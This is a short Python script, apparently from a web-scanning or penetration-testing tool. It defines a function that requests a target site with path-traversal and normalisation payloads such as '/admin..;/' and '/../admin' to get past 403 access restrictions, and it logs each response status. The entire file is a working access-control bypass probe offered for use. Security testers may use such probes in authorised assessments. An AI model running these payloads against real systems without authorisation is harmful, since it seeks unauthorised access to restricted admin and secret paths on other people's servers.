import requests

def test_403_bypass(base_url, log_func):
    payloads = [
        "/admin..;/", "/../admin", "/whatever/../admin",
        "/secret/./", "/secret/."
    ]
    for path in payloads:
        url = base_url.rstrip("/") + path
        try:
            r = requests.get(url, timeout=5)
            print(f"[+] {r.status_code} -> {url}")
            log_func("agent_bypass", {"url": url, "status": r.status_code})
        except Exception as e:
            print(f"[-] {url} ERROR: {e}")
            log_func("agent_bypass", {"url": url, "error": str(e)})
